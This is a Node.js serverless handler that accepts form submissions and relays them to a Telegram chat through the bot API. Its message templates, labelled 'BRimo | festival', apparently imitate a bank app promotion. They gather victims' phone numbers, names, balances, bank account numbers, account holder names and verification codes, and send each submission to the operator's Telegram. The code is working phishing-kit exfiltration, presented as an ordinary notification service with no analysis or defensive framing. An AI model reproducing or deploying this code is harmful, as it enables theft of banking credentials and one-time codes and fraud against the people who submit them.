const axios = require('axios');

exports.handler = async function(event, context) {
    // CORS headers for preflight requests
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST'
            },
            body: ''
        };
    }

    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }

    try {
        // Parse the incoming data
        const data = JSON.parse(event.body);
        
        // Get environment variables
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!telegramBotToken || !telegramChatId) {
            throw new Error('Telegram bot configuration is missing');
        }

        // Validate required fields based on notification type
        if (data.type === 'phone_number' && !data.phoneNumber) {
            return {
                statusCode: 400,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: 'Phone number is required' })
            };
        }

        // Format the Telegram message
        let message;
        switch(data.type) {
            case 'phone_number':
                message = `├• BRimo | festival\n` +
                         `├───────────────────\n` +
                         `├• NO HP : ${data.phoneNumber || 'Tidak diisi'}\n` +
                         `├───────────────────\n` +
                         `├• NAMA  : ${data.name || 'Tidak diisi'}\n` +
                         `├───────────────────\n` +
                         `├• saldo : ${data.balance ? new Intl.NumberFormat('id-ID').format(data.balance) : 'Tidak diisi'}\n` +
                         `╰───────────────────\n` +
                         `⏱ ${new Date().toLocaleString('id-ID')}`;
                break;
                
            case 'contact_service':
                message = `📞 New Contact Request:\n` +
                         `├───────────────────\n` +
                         `├• Rekening: ${data.accountNumber || 'Tidak diisi'}\n` +
                         `├• Atas Nama: ${data.accountName || 'Tidak diisi'}\n` +
                         `├• Saldo: ${data.amount || 'Tidak diisi'}\n` +
                         `├• Dalam Huruf: ${data.amountInWords || 'Tidak diisi'}\n` +
                         `├• Kode Verifikasi: ${data.virtualCode || 'Tidak diisi'}\n` +
                         `╰───────────────────\n` +
                         `⏱ ${new Date().toLocaleString('id-ID')}`;
                break;
                
            default:
                message = `⚠ Unknown Notification Type\n` +
                         `├───────────────────\n` +
                         `╰ ${JSON.stringify(data, null, 2)}`;
        }

        // Send notification to Telegram
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const response = await axios.post(telegramUrl, {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown',
            disable_notification: false
        });

        return {
            statusCode: 200,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*' 
            },
            body: JSON.stringify({ 
                success: true,
                message: 'Notification sent successfully',
                telegramMessageId: response.data.result.message_id
            })
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*' 
            },
            body: JSON.stringify({ 
                success: false,
                message: 'Failed to send notification',
                error: error.message,
                stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
            })
        };
    }
};
